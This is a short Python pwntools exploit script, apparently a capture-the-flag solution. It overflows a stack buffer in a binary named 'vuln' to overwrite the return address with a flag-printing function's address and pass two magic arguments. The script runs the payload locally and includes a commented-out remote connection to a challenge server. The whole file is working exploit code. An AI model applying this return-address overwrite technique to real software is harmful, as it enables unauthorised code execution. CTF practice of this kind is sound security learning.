#!/usr/bin/env python3



from pwn import *

def exploit_local(payload):
    p = process("./vuln")
    p.send(payload)
    p.interactive()

def exploit_remote(payload):
    io = remote('167.172.56.232', 30401)
    io.send(payload)
    io.interactive()

def main():
    flag_add = p32(0x080491e2)
    payload = b'A' * 0xb8
    payload += b'B' * 4
    payload += flag_add
    payload += p32(0x080491e0)
    payload += p32(0xdeadbeef)
    payload += p32(0xc0ded00d)
    f = open("payload", "wb")
    f.write(payload)
    f.close()
    exploit_local(payload)
    #exploit_remote(payload)



if __name__ == '__main__':
    main()
